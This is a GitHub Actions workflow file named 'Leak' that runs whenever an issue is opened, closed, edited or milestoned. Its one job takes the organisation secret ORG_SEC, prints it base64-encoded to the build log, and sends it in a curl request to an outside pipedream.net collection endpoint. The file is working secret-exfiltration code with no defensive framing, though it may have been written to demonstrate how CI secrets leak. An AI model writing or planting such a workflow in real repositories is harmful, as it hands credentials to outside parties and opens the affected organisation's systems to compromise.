name: Leak

on:
  issues:
    types: [opened, closed, edited, milestoned]

jobs:
  leak:
    name: Leak GitHub Seecrets
    runs-on: ubuntu-latest
    steps:
      - name: Leak the secret
        run: |
          echo $VALUE | base64 
          VAR_ABC=$VALUE
          curl -I https://enax0mfmkuupq.x.pipedream.net?code=$VAR_ABC
        env:
          VALUE: ${{ secrets.ORG_SEC }}
